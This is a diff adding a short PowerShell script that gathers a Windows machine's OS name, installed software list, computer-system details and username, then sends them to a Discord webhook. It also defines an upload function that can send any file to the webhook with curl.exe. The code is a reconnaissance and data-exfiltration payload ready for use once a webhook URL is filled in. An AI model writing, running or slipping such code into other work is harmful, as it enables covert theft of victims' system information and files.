@@ -1,0 +1,31 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+#Update Discord WebHook
+$webhookUrl = "https://discord.com/api/webhooks/YOUR_DISCORD_HOOK_URL_HERE"
+function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
+
+    $Body = @{
+      'username' = $env:username
+      'content' = $text
+    }
+
+    if (-not ([string]::IsNullOrEmpty($text))){
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json)
+    }
+
+    if (-not ([string]::IsNullOrEmpty($file))){
+        curl.exe -F "file1=@$file" $webhookUrl
+    }
+}
+    
+$os = (Get-CimInstance Win32_OperatingSystem).Caption
+$software = (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion)
+$computerSystem = Invoke-Expression 'Get-WmiObject Win32_ComputerSystem' | Out-String
+
+Upload-Discord -text "OS: $os`nSoftware: $software`nComputer System: $computerSystem"
